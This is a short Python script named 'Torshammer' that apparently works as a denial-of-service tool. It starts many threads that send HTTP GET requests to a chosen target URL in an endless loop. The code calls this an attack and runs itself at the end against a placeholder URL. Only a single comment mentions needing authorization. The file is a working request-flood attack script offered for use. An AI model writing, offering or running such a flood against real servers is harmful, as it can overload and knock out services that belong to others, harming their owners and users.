import requests
import threading
import time

class Torshammer:
    def __init__(self, target_url, threads=10, delay=0.1):
        self.target_url = target_url
        self.threads = threads
        self.delay = delay

    def send_request(self):
        """Send a single HTTP GET request to the target URL."""
        try:
            response = requests.get(self.target_url, timeout=5)
            print(f"Request sent. Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    def thread_target(self):
        """Target function for each thread, sending requests in a loop with a delay."""
        while True:
            self.send_request()
            time.sleep(self.delay)

    def start_attack(self):
        """Start the multi-threaded attack with specified number of threads."""
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.thread_target)
            thread.daemon = True  # Allows the program to exit even if threads are still running
            thread.start()
            threads.append(thread)

        # Keep main thread alive while child threads run
        for thread in threads:
            thread.join()

# User inputs for testing purposes
target_url = "http://example.com"  # replace with the target URL (must be authorized to test)
threads = 20  # number of concurrent threads
delay = 0.1  # delay between requests in seconds

# Initialize and start the tool
hammer = Torshammer(target_url=target_url, threads=threads, delay=delay)
hammer.start_attack()
